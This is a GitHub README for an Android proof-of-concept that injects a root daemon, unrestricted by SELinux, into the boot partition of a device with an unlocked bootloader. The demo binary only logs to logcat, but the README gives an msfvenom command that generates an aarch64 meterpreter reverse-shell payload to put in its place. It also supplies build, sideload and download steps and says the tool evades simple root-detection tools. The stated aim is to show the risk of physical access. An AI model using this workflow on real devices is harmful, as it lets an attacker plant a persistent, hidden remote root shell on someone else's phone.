# Unlocked bootloader backdoor demo for Android

This is a tool that installs a custom binary into a system partition. This binary runs as a system daemon with root privileges and not restricted by SELinux policies. This tool is based on [Magisk](https://github.com/topjohnwu/Magisk) source code, but does not necessary require root or magisk preinstalled on the device. So basically this IS the magisk but only the part that injects new SELinux policies. It injects magiskinit binary in boot partition but does not install or use any other magisk tools. It also does not add any magisk files to device filesysytem, which allows it to avoid simple root detection tools, but unfortunately it is still detectable by SafetyNet.         

The goal of this is to show that unlocking the bootloader can expose your device to an attacker with physical access.

I successfully tested it on android 9 with normal init process and android 10 with two-staged init. It should work on other configurations as well but there can be troubles.

In this repo the embedded binary is made for the demo purposes only. It just drops a line to logcat once in 5 seconds, but you cat replace it with your own if you want. For example, if you are on Kali you can generate the reverse shell payload:
```
$ rm revshell/revshell
$ msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=<YOUR_LISTENER_IP> LPORT=<YOUR_LISTENER_PORT> -f elf > revshell/revshell
```
After that you can build the packages and flash your binary instead of the one provided with the repo.  

## Prerequisites

- First, you have to install android SDK for your OS if you haven't already.
- Second, make sure you have python3 installed.

After that you are all set up.

## Build

The result package is a TWRP sideloadable zip file.

set a ANDROID_SDK_ROOT variable in your shell. For example:  
```
$ ANDROID_SDK_ROOT=/usr/lib/android-sdk
$ export ANDROID_SDK_ROOT
```

Prepare NDK for the build:
```
$ ./build_revshell.py ndk
```

Run the build:
```
$ ./build_revshell.py
```

## Download

You can download release packages directly:
- [zip_reverse_shell_install.zip](https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo/releases/download/v1.0/zip_reverse_shell_install.zip)
- [zip_reverse_shell_uninstall.zip](https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo/releases/download/v1.0/zip_reverse_shell_uninstall.zip)

## Install

Run TWRP on your device.

Start sideload feature in Advanced/Sideload and then run:
```
$ adb sideload zip_reverse_shell_install.zip
```

Check out the output log carefully. If you have been warned that you need to backup original partitions then you have to run the command below BEFORE rebooting into system, otherwise you will not be able to uninstall this tool properly and will have to find stock boot image for your device somewhere and flash it.
```
$ adb pull /tmp/backup_original_partitions .
```

Reboot into system.

You should now be able to see new lines in logcat:

```
$ adb logcat | grep revshell
01-31 23:42:07.587  3589  3589 D revshell: Start successfull!
01-31 23:42:07.588  3589  3589 D revshell: Signals are set to ignore
01-31 23:42:07.588  3589  3589 D revshell: Hey I'm a revshell process!
01-31 23:42:07.588  3589  3589 D revshell: My PID -- 3589
01-31 23:42:07.588  3589  3589 D revshell: My parent PID -- 1
01-31 23:42:07.588  3589  3589 D revshell: My UID -- 0
01-31 23:42:07.588  3589  3589 D revshell: Awaiting encrypted FS decryption now...
01-31 23:42:27.597  3589  3589 D revshell: FS has been decrypted!
01-31 23:42:27.597  3589  3589 D revshell: Starting reverse shell now
01-31 23:42:32.597  3589  3589 D revshell: tick ! 25 seconds since process started
01-31 23:42:37.598  3589  3589 D revshell: tick ! 30 seconds since process started
01-31 23:42:42.599  3589  3589 D revshell: tick ! 35 seconds since process started
01-31 23:42:47.600  3589  3589 D revshell: tick ! 40 seconds since process started
```

## Uninstall

Use zip_reverse_shell_uninstall.zip to properly uninstall this tool. 

If during installation you have made a backup of original partitions then run:
```
$ adb push backup_original_partitions /tmp/backup_original_partitions
```

Start sideload feature in Advanced/Sideload and then run:
```
$ adb sideload zip_reverse_shell_uninstall.zip
```

Reboot into system.

## Acknowledgments

Great thanks to topjohnwu and magisk contributors for their amazing work and incredible contribution to android tinkerers community. This Demo wouldn't even exist without them. 

## Links:

[Original Magisk repository](https://github.com/topjohnwu/Magisk)
